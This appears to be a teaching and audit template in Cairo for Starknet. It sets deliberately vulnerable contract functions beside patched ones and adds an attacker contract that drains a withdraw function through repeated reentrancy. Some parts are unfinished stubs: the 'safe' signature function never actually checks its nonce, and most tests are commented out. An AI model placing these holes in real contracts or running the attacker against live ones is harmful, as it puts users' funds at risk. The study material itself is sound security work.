// Cairo (Starknet) Exploit PoC Template
// Common attack vectors for Starknet contracts
//
// COMMON VULNERABILITIES:
// 1. Missing caller validation
// 2. Felt252 overflow/underflow
// 3. Reentrancy
// 4. Storage collision
// 5. L1-L2 message vulnerabilities
// 6. Signature malleability
// 7. Access control bypass

use starknet::ContractAddress;

#[starknet::interface]
trait IVulnerableContract<TContractState> {
    fn vulnerable_withdraw(ref self: TContractState, amount: u256);
    fn safe_withdraw(ref self: TContractState, amount: u256);
    fn vulnerable_admin_action(ref self: TContractState);
    fn safe_admin_action(ref self: TContractState);
}

#[starknet::contract]
mod VulnerableContract {
    use starknet::{
        ContractAddress,
        get_caller_address,
        get_contract_address,
        contract_address_const,
    };
    use starknet::storage::{
        StoragePointerReadAccess,
        StoragePointerWriteAccess,
        Map,
        StorageMapReadAccess,
        StorageMapWriteAccess,
    };

    // =========================================================================
    // STORAGE
    // =========================================================================
    #[storage]
    struct Storage {
        admin: ContractAddress,
        balances: Map<ContractAddress, u256>,
        total_supply: u256,
        is_initialized: bool,
        // For reentrancy demo
        locked: bool,
    }

    // =========================================================================
    // EVENTS
    // =========================================================================
    #[event]
    #[derive(Drop, starknet::Event)]
    enum Event {
        Withdrawal: Withdrawal,
        AdminChanged: AdminChanged,
    }

    #[derive(Drop, starknet::Event)]
    struct Withdrawal {
        user: ContractAddress,
        amount: u256,
    }

    #[derive(Drop, starknet::Event)]
    struct AdminChanged {
        old_admin: ContractAddress,
        new_admin: ContractAddress,
    }

    // =========================================================================
    // ERRORS
    // =========================================================================
    mod Errors {
        const NOT_AUTHORIZED: felt252 = 'Caller is not authorized';
        const INSUFFICIENT_BALANCE: felt252 = 'Insufficient balance';
        const ALREADY_INITIALIZED: felt252 = 'Already initialized';
        const OVERFLOW: felt252 = 'Arithmetic overflow';
        const REENTRANCY: felt252 = 'Reentrancy detected';
    }

    // =========================================================================
    // VULNERABILITY 1: Missing Caller Validation
    // =========================================================================

    #[external(v0)]
    fn vulnerable_set_admin(ref self: ContractState, new_admin: ContractAddress) {
        // BUG: No check that caller is current admin!
        // Anyone can call this and become admin
        let old_admin = self.admin.read();
        self.admin.write(new_admin);

        self.emit(AdminChanged { old_admin, new_admin });
    }

    #[external(v0)]
    fn safe_set_admin(ref self: ContractState, new_admin: ContractAddress) {
        let caller = get_caller_address();
        let current_admin = self.admin.read();

        // Verify caller is current admin
        assert(caller == current_admin, Errors::NOT_AUTHORIZED);

        self.admin.write(new_admin);
        self.emit(AdminChanged { old_admin: current_admin, new_admin });
    }

    // =========================================================================
    // VULNERABILITY 2: Felt252 Overflow
    // =========================================================================

    #[external(v0)]
    fn vulnerable_add_balance(ref self: ContractState, amount: felt252) {
        let caller = get_caller_address();

        // BUG: felt252 arithmetic can overflow!
        // felt252 is modulo a prime (~2^252)
        // Different behavior than u256
        let current: felt252 = 100; // example
        let new_balance = current + amount;  // Can wrap around!

        // This creates exploitable conditions
    }

    #[external(v0)]
    fn safe_add_balance(ref self: ContractState, amount: u256) {
        let caller = get_caller_address();
        let current = self.balances.read(caller);

        // u256 addition panics on overflow in Cairo
        // Or use checked arithmetic
        let new_balance = current + amount;

        // Additional bound check
        assert(new_balance >= current, Errors::OVERFLOW);

        self.balances.write(caller, new_balance);
    }

    // =========================================================================
    // VULNERABILITY 3: Reentrancy
    // =========================================================================

    #[starknet::interface]
    trait ICallback<TContractState> {
        fn on_withdraw(ref self: TContractState, amount: u256);
    }

    #[external(v0)]
    fn vulnerable_withdraw_with_callback(
        ref self: ContractState,
        amount: u256,
        callback_contract: ContractAddress,
    ) {
        let caller = get_caller_address();
        let balance = self.balances.read(caller);

        assert(balance >= amount, Errors::INSUFFICIENT_BALANCE);

        // BUG: External call BEFORE state update!
        // Callback can reenter and withdraw again
        let callback = ICallbackDispatcher { contract_address: callback_contract };
        callback.on_withdraw(amount);

        // State update after external call - VULNERABLE
        self.balances.write(caller, balance - amount);
    }

    #[external(v0)]
    fn safe_withdraw_with_callback(
        ref self: ContractState,
        amount: u256,
        callback_contract: ContractAddress,
    ) {
        // Reentrancy guard
        assert(!self.locked.read(), Errors::REENTRANCY);
        self.locked.write(true);

        let caller = get_caller_address();
        let balance = self.balances.read(caller);

        assert(balance >= amount, Errors::INSUFFICIENT_BALANCE);

        // State update BEFORE external call (CEI pattern)
        self.balances.write(caller, balance - amount);

        // External call after state update
        let callback = ICallbackDispatcher { contract_address: callback_contract };
        callback.on_withdraw(amount);

        self.locked.write(false);
    }

    // =========================================================================
    // VULNERABILITY 4: Missing Initialization Check
    // =========================================================================

    #[external(v0)]
    fn vulnerable_initialize(ref self: ContractState, admin: ContractAddress) {
        // BUG: No check if already initialized!
        // Anyone can reinitialize and become admin
        self.admin.write(admin);
    }

    #[external(v0)]
    fn safe_initialize(ref self: ContractState, admin: ContractAddress) {
        // Check not already initialized
        assert(!self.is_initialized.read(), Errors::ALREADY_INITIALIZED);

        self.admin.write(admin);
        self.is_initialized.write(true);
    }

    // =========================================================================
    // VULNERABILITY 5: L1-L2 Message Validation
    // =========================================================================

    // Handling messages from L1
    #[l1_handler]
    fn vulnerable_handle_l1_message(
        ref self: ContractState,
        from_address: felt252,  // L1 sender
        user: ContractAddress,
        amount: u256,
    ) {
        // BUG: Not validating L1 sender address!
        // Anyone on L1 can send malicious messages
        let current = self.balances.read(user);
        self.balances.write(user, current + amount);
    }

    #[l1_handler]
    fn safe_handle_l1_message(
        ref self: ContractState,
        from_address: felt252,
        user: ContractAddress,
        amount: u256,
    ) {
        // Validate L1 sender is our trusted bridge
        let trusted_bridge: felt252 = 0x1234; // Your L1 contract address
        assert(from_address == trusted_bridge, Errors::NOT_AUTHORIZED);

        let current = self.balances.read(user);
        self.balances.write(user, current + amount);
    }

    // =========================================================================
    // VULNERABILITY 6: Signature Validation
    // =========================================================================

    use core::ecdsa::check_ecdsa_signature;

    #[external(v0)]
    fn vulnerable_execute_with_signature(
        ref self: ContractState,
        message_hash: felt252,
        signature_r: felt252,
        signature_s: felt252,
        public_key: felt252,
    ) {
        // BUG: Not checking for signature malleability!
        // Same message can have multiple valid signatures
        // This can enable replay attacks in some contexts
        let is_valid = check_ecdsa_signature(
            message_hash, public_key, signature_r, signature_s
        );
        assert(is_valid, Errors::NOT_AUTHORIZED);

        // Execute action...
    }

    #[external(v0)]
    fn safe_execute_with_signature(
        ref self: ContractState,
        message_hash: felt252,
        signature_r: felt252,
        signature_s: felt252,
        public_key: felt252,
        nonce: felt252,
    ) {
        // Use nonce to prevent replay
        // Store used nonces in storage
        // Include nonce in message_hash

        let is_valid = check_ecdsa_signature(
            message_hash, public_key, signature_r, signature_s
        );
        assert(is_valid, Errors::NOT_AUTHORIZED);

        // Mark nonce as used...
        // Execute action...
    }

    // =========================================================================
    // IMPLEMENTATION
    // =========================================================================

    #[abi(embed_v0)]
    impl VulnerableContractImpl of super::IVulnerableContract<ContractState> {
        fn vulnerable_withdraw(ref self: ContractState, amount: u256) {
            let caller = get_caller_address();
            let balance = self.balances.read(caller);

            // BUG: No balance check!
            self.balances.write(caller, balance - amount);

            self.emit(Withdrawal { user: caller, amount });
        }

        fn safe_withdraw(ref self: ContractState, amount: u256) {
            let caller = get_caller_address();
            let balance = self.balances.read(caller);

            // Proper balance check
            assert(balance >= amount, Errors::INSUFFICIENT_BALANCE);

            self.balances.write(caller, balance - amount);
            self.emit(Withdrawal { user: caller, amount });
        }

        fn vulnerable_admin_action(ref self: ContractState) {
            // BUG: Anyone can call!
            self.total_supply.write(0);
        }

        fn safe_admin_action(ref self: ContractState) {
            let caller = get_caller_address();
            assert(caller == self.admin.read(), Errors::NOT_AUTHORIZED);

            self.total_supply.write(0);
        }
    }
}

// =============================================================================
// ATTACKER CONTRACT (for reentrancy demo)
// =============================================================================
#[starknet::contract]
mod Attacker {
    use starknet::{ContractAddress, get_contract_address};

    #[storage]
    struct Storage {
        target: ContractAddress,
        attack_count: u8,
    }

    #[starknet::interface]
    trait IVulnerable<TContractState> {
        fn vulnerable_withdraw_with_callback(
            ref self: TContractState,
            amount: u256,
            callback_contract: ContractAddress,
        );
    }

    #[external(v0)]
    fn attack(ref self: ContractState, target: ContractAddress, amount: u256) {
        self.target.write(target);
        self.attack_count.write(0);

        let this = get_contract_address();
        let target_contract = IVulnerableDispatcher { contract_address: target };
        target_contract.vulnerable_withdraw_with_callback(amount, this);
    }

    // Callback that reenters
    #[external(v0)]
    fn on_withdraw(ref self: ContractState, amount: u256) {
        let count = self.attack_count.read();

        // Reenter up to 5 times
        if count < 5 {
            self.attack_count.write(count + 1);

            let this = get_contract_address();
            let target = self.target.read();
            let target_contract = IVulnerableDispatcher { contract_address: target };

            // REENTER!
            target_contract.vulnerable_withdraw_with_callback(amount, this);
        }
    }
}

// =============================================================================
// TESTS
// =============================================================================
#[cfg(test)]
mod tests {
    use super::{VulnerableContract, Attacker};
    use starknet::{ContractAddress, contract_address_const};
    use starknet::testing::{set_caller_address, set_contract_address};

    #[test]
    fn test_missing_auth_exploit() {
        // Setup: Deploy contract with admin = 0x1
        // Action: Call vulnerable_set_admin as 0x2
        // Result: 0x2 becomes admin (exploit successful)

        let admin = contract_address_const::<0x1>();
        let attacker = contract_address_const::<0x2>();

        // Deploy and set initial admin...

        // Attacker calls vulnerable_set_admin
        set_caller_address(attacker);
        // contract.vulnerable_set_admin(attacker);

        // Verify attacker is now admin
        // assert(contract.admin.read() == attacker, 'Exploit failed');
    }

    #[test]
    #[should_panic(expected: ('Caller is not authorized',))]
    fn test_safe_admin_rejects_attacker() {
        let admin = contract_address_const::<0x1>();
        let attacker = contract_address_const::<0x2>();

        // Setup with admin...

        // Attacker tries safe_set_admin - should panic
        set_caller_address(attacker);
        // contract.safe_set_admin(attacker);
    }
}
